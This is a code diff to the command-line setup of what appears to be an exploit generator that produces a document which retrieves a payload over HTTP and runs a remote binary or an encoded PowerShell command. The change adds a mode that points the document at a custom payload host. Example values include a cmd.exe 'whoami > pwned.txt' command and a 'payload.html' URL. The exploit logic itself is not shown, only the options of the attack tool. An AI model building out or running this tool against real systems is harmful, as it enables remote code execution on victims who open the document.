@@ -25,15 +25,16 @@ if __name__ == "__main__":
     required = parser.add_argument_group('Required Arguments')
     binary = parser.add_argument_group('Binary Execution Arguments')
     command = parser.add_argument_group('Command Execution Arguments')
+    url = parser.add_argument_group('Custom URL Execution Arguments')
     optional = parser.add_argument_group('Optional Arguments')
-    required.add_argument('-m', '--mode', action='store', dest='mode', choices={"binary", "command"},
+    required.add_argument('-m', '--mode', action='store', dest='mode', choices={"binary", "command", "url"},
         help='Execution mode, can be "binary" to load a (remote) binary, or "command" to run an encoded PS command', required=True)
     binary.add_argument('-b', '--binary', action='store', dest='binary', 
         help='The full path of the binary to run. Can be local or remote from an SMB share')
     command.add_argument('-c', '--command', action='store', dest='command',
         help='The encoded command to execute in "command" mode')
-    optional.add_argument('-u', '--url', action='store', dest='url', default='localhost',
-        help='The hostname or IP address where the generated document should retrieve your payload, defaults to "localhost". If specifying a custom host, you must include the protocol and port.')
+    url.add_argument('-u', '--url', action='store', dest='url',
+        help='The hostname or IP address where the generated document should retrieve your payload')
     optional.add_argument('-H', '--host', action='store', dest='host', default="0.0.0.0",
         help='The interface for the web server to listen on, defaults to all interfaces (0.0.0.0)')
     optional.add_argument('-P', '--port', action='store', dest='port', default=80, type=int,
@@ -46,6 +47,13 @@ if __name__ == "__main__":
 
     if args.mode == "command" and args.command is None:
         raise SystemExit("Command mode requires a command to be specified, e.g. -c 'c:\\windows\\system32\\cmd.exe /c whoami > c:\\users\\public\\pwned.txt'")
+
+
+    if args.mode == "url" and args.url is None:
+        raise SystemExit("URL mode requires a hostname or IP address to be specified, e.g. -u 'http://example.com/payload.html'")
+
+    if args.mode != "url":
+        args.url = "localhost"
 
     payload_url = f"http://{args.url}:{args.port}/exploit.html"
 
